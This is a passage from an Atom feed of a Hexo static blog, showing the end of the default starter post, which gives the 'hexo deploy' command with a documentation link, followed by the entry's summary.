remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
